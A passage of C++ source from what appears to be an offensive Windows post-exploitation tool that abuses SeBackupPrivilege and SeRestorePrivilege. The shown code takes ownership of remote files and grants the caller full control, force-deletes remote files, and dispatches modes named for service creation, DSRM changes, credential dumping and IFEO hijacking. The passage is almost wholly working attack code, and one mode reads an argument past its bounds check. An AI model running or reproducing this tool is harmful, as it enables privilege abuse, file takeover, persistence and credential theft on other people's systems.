	NtCreateFile_t NtCreateFilePtr = reinterpret_cast<NtCreateFile_t>(GetProcAddress(ntdll, "NtCreateFile"));
	RtlNtStatusToDosError_t RtlNtStatusToDosErrorPtr = reinterpret_cast<RtlNtStatusToDosError_t>(GetProcAddress(ntdll, "RtlNtStatusToDosError"));

	if (NtCreateFilePtr == NULL) {
		printf("[-] NtCreateFile is not available.\n");
		return;
	}

	auto formatStatus = [&](NTSTATUS status) -> std::string {
		if (RtlNtStatusToDosErrorPtr) {
			DWORD winError = RtlNtStatusToDosErrorPtr(status);
			if (winError != 0) {
				return FormatErrorMessage(winError);
			}
		}
		char buffer[32];
		snprintf(buffer, sizeof(buffer), "NTSTATUS 0x%08lx", static_cast<long>(status));
		return std::string(buffer);
	};

	auto initUnicodeString = [](UNICODE_STRING_LOCAL& ustr, const std::wstring& value) {
		size_t byteLength = value.size() * sizeof(wchar_t);
		if (byteLength > 0xFFFF) {
			ustr.Length = 0;
			ustr.MaximumLength = 0;
			ustr.Buffer = nullptr;
			return false;
		}
		ustr.Length = static_cast<USHORT>(byteLength);
		ustr.MaximumLength = static_cast<USHORT>(byteLength);
		ustr.Buffer = const_cast<PWSTR>(value.c_str());
		return true;
	};

	auto initObjectAttributes = [](OBJECT_ATTRIBUTES_LOCAL& attrs, UNICODE_STRING_LOCAL& name) {
		attrs.Length = sizeof(OBJECT_ATTRIBUTES_LOCAL);
		attrs.RootDirectory = NULL;
		attrs.ObjectName = &name;
		attrs.Attributes = OBJ_CASE_INSENSITIVE;
		attrs.SecurityDescriptor = NULL;
		attrs.SecurityQualityOfService = NULL;
	};

	UNICODE_STRING_LOCAL remoteName = {};
	if (!initUnicodeString(remoteName, remoteNtPath)) {
		printf("[-] Remote NT path is too long.\n");
		return;
	}

	OBJECT_ATTRIBUTES_LOCAL remoteAttributes = {};
	initObjectAttributes(remoteAttributes, remoteName);

	IO_STATUS_BLOCK_LOCAL remoteStatus = {};

	HANDLE remoteHandle = NULL;
	NTSTATUS status = NtCreateFilePtr(
		&remoteHandle,
		DELETE | SYNCHRONIZE,
		&remoteAttributes,
		&remoteStatus,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
		NULL,
		0);
	if (!NT_SUCCESS(status)) {
		std::string message = formatStatus(status);
		printf("[-] NtCreateFile (remote: %s) failed: %s\n", remotePath, message.c_str());
		return;
	}

#ifndef FILE_DISPOSITION_FLAG_DELETE
#define FILE_DISPOSITION_FLAG_DELETE 0x00000001
#endif
#ifndef FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
#define FILE_DISPOSITION_FLAG_POSIX_SEMANTICS 0x00000002
#endif
#ifndef FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE
#define FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE 0x00000010
#endif
#ifndef FILE_DISPOSITION_INFO
	typedef struct _FILE_DISPOSITION_INFO {
		BOOLEAN DeleteFile;
	} FILE_DISPOSITION_INFO, *PFILE_DISPOSITION_INFO;
#endif
#ifndef FileDispositionInfoEx
#define FileDispositionInfoEx static_cast<FILE_INFO_BY_HANDLE_CLASS>(21)
#endif

	bool deleted = false;
	DWORD lastError = ERROR_SUCCESS;

#ifdef FILE_DISPOSITION_INFO_EX
	FILE_DISPOSITION_INFO_EX dispositionEx = {};
	dispositionEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS | FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE;
	if (SetFileInformationByHandle(remoteHandle, FileDispositionInfoEx, &dispositionEx, sizeof(dispositionEx))) {
		deleted = true;
	}
	else {
		lastError = GetLastError();
	}
#endif

	if (!deleted) {
		FILE_DISPOSITION_INFO disposition = {};
		disposition.DeleteFile = TRUE;
		if (SetFileInformationByHandle(remoteHandle, FileDispositionInfo, &disposition, sizeof(disposition))) {
			deleted = true;
			lastError = ERROR_SUCCESS;
		}
		else if (lastError == ERROR_SUCCESS) {
			lastError = GetLastError();
		}
	}

	if (!deleted) {
		DWORD error = (lastError == ERROR_SUCCESS) ? GetLastError() : lastError;
		std::string message = FormatErrorMessage(error);
		printf("[-] Failed to delete remote file %s: %lu - %s\n", remotePath, error, message.c_str());
		CloseHandle(remoteHandle);
		return;
	}

	CloseHandle(remoteHandle);
	printf("[+] Deleted %s using SeRestorePrivilege.\n", remotePath);
}

void ownremote(){
	const char* remotePath = target;

	if ((remotePath == NULL || remotePath[0] == '\0') && behaviour && behaviour[0] != '\0') {
		remotePath = behaviour;
	}
	if ((remotePath == NULL || remotePath[0] == '\0') && dumppath && dumppath[0] != '\0') {
		remotePath = dumppath;
	}

	if (remotePath == NULL || remotePath[0] == '\0') {
		printf("[-] Remote file path is missing.\n");
		return;
	}

	if (!EnablePrivilege(SE_BACKUP_NAME)) {
		printf("[-] Unable to enable SeBackupPrivilege.\n");
		return;
	}

	if (!EnablePrivilege(SE_RESTORE_NAME)) {
		printf("[-] Unable to enable SeRestorePrivilege.\n");
		return;
	}

	HANDLE processToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &processToken)) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] OpenProcessToken failed: %lu - %s\n", error, message.c_str());
		return;
	}

	DWORD tokenInfoLength = 0;
	GetTokenInformation(processToken, TokenUser, NULL, 0, &tokenInfoLength);
	if (tokenInfoLength == 0) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] GetTokenInformation size query failed: %lu - %s\n", error, message.c_str());
		CloseHandle(processToken);
		return;
	}

	std::vector<BYTE> tokenBuffer(tokenInfoLength);
	if (!GetTokenInformation(processToken, TokenUser, tokenBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] GetTokenInformation failed: %lu - %s\n", error, message.c_str());
		CloseHandle(processToken);
		return;
	}

	CloseHandle(processToken);

	PTOKEN_USER tokenUser = reinterpret_cast<PTOKEN_USER>(tokenBuffer.data());
	PSID callerSid = tokenUser ? tokenUser->User.Sid : NULL;
	if (callerSid == NULL || !IsValidSid(callerSid)) {
		printf("[-] Caller SID is invalid.\n");
		return;
	}

	std::wstring remotePathW = ConvertToWide(remotePath);
	if (remotePathW.empty()) {
		printf("[-] Failed to convert remote path to wide string.\n");
		return;
	}

	std::wstring extendedRemotePath = BuildExtendedPath(remotePathW);

	HANDLE remoteHandle = CreateFileW(
		extendedRemotePath.c_str(),
		WRITE_DAC | WRITE_OWNER | READ_CONTROL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_FOR_BACKUP_INTENT,
		NULL);
	if (remoteHandle == INVALID_HANDLE_VALUE) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] CreateFileW (remote: %s) failed: %lu - %s\n", remotePath, error, message.c_str());
		return;
	}

	PSECURITY_DESCRIPTOR securityDescriptor = NULL;
	PACL existingDacl = NULL;
	PSID existingOwner = NULL;
	DWORD securityResult = GetSecurityInfo(remoteHandle, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, &existingOwner, NULL, &existingDacl, NULL, &securityDescriptor);
	if (securityResult != ERROR_SUCCESS) {
		std::string message = FormatErrorMessage(securityResult);
		printf("[-] GetSecurityInfo failed: %lu - %s\n", securityResult, message.c_str());
		CloseHandle(remoteHandle);
		return;
	}

	EXPLICIT_ACCESSW accessEntry = {};
	accessEntry.grfAccessPermissions = GENERIC_ALL;
	accessEntry.grfAccessMode = GRANT_ACCESS;
	accessEntry.grfInheritance = NO_INHERITANCE;
	accessEntry.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	accessEntry.Trustee.TrusteeType = TRUSTEE_IS_USER;
	accessEntry.Trustee.ptstrName = reinterpret_cast<LPWSTR>(callerSid);

	PACL updatedDacl = NULL;
	DWORD aclResult = SetEntriesInAclW(1, &accessEntry, existingDacl, &updatedDacl);
	if (aclResult != ERROR_SUCCESS) {
		std::string message = FormatErrorMessage(aclResult);
		printf("[-] SetEntriesInAclW failed: %lu - %s\n", aclResult, message.c_str());
		if (securityDescriptor) {
			LocalFree(securityDescriptor);
		}
		CloseHandle(remoteHandle);
		return;
	}

	DWORD setResult = SetSecurityInfo(remoteHandle, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, callerSid, NULL, updatedDacl, NULL);
	if (setResult != ERROR_SUCCESS) {
		std::string message = FormatErrorMessage(setResult);
		printf("[-] SetSecurityInfo failed: %lu - %s\n", setResult, message.c_str());
	}
	else {
		printf("[+] Updated owner and DACL for %s using SeRestorePrivilege.\n", remotePath);
	}

	if (updatedDacl) {
		LocalFree(updatedDacl);
	}
	if (securityDescriptor) {
		LocalFree(securityDescriptor);
	}
	CloseHandle(remoteHandle);
}

int main(int argc, LPCSTR argv[])
{
	if (argc < 2) {
		help();
		return 0;
	}
	mode = argv[1];
	if (strcmp(mode, "SERVICE") == 0) {
		if (argc < 7) {
			help();
			return 0;
		}
		printf("SERVICE MODE\n");
		servicepath = argv[2];
		target = argv[3];
		servicename = argv[4];
		displayname = argv[5];
		description = argv[6];
		service();
	}
	else if (strcmp(mode, "DSRM") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("DSRM MODE\n");
		target = argv[2];
		value = atoi(argv[3]);
		dsrm();
	}
	else if (strcmp(mode, "DUMP") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("DUMP MODE\n");
		dumppath = argv[2];
		target = argv[3];
		dump();
	}
	else if (strcmp(mode, "IFEO") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("IFEO MODE\n");
		ifeoservice = argv[2];
		ifeoservicepath = argv[3];
		target = argv[4];
		ifeo();
	}
	else if (strcmp(mode, "COPYLOCAL") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("COPYLOCAL MODE\n");
		servicepath = argv[2];
		target = argv[3];
		copylocal();
	}
	else if (strcmp(mode, "COPYREMOTE") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("COPYREMOTE MODE\n");
		servicepath = argv[2];
		target = argv[3];
		copyremote();
	}
	else if (strcmp(mode, "OWNREMOTE") == 0) {
		if (argc < 3) {
			help();
			return 0;
		}
		printf("OWNREMOTE MODE\n");
		target = argv[2];
		ownremote();
	}
	else if (strcmp(mode, "DELREMOTE") == 0) {
		if (argc < 3) {
			help();
			return 0;
		}
		printf("DELREMOTE MODE\n");
		target = argv[2];
		delremote();
	}

	else {
		help();
		return 0;
	}
	return 0;
}
